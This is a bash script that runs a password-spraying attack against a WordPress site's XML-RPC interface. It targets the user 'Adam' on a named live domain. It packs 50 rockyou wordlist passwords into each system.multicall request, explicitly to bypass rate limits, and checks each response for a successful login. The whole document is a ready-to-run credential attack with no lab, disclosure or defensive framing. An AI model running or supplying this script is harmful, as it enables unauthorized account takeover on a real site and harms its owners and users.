#!/bin/bash
# Password spray against user "Adam" via XML-RPC system.multicall
# 50 passwords per request to bypass rate limits

USER="Adam"
WORDLIST="/usr/share/wordlists/rockyou.txt"
COUNTER=0
BATCH=""

cat "$WORDLIST" | while read PASS; do
  # Escape XML special chars
  PASS_ESCAPED=$(echo "$PASS" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g; s/'"'"'/\&apos;/g')
  
  BATCH+="<value><struct>
    <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
    <member><name>params</name><value><array><data>
      <value><string>${USER}</string></value>
      <value><string>${PASS_ESCAPED}</string></value>
    </data></array></value></member>
  </struct></value>"
  
  COUNTER=$((COUNTER + 1))
  
  if [ $COUNTER -ge 50 ]; then
    # Send batch of 50
    XML="""<?xml version=\"1.0\"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            ${BATCH}
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>"""
    
    echo "$XML" > /tmp/spray_batch.xml
    
    RESPONSE=$(curl -s -X POST https://churchofsatan.com/xmlrpc.php \
      -H "Content-Type: text/xml" \
      -d @/tmp/spray_batch.xml)
    
    # Check for success (response will contain user info instead of fault)
    if echo "$RESPONSE" | grep -q "isAdmin\|blogid\|url"; then
      echo "[+] SUCCESS! Password found in this batch"
      echo "$RESPONSE"
    fi
    
    # Reset
    BATCH=""
    COUNTER=0
  fi
done
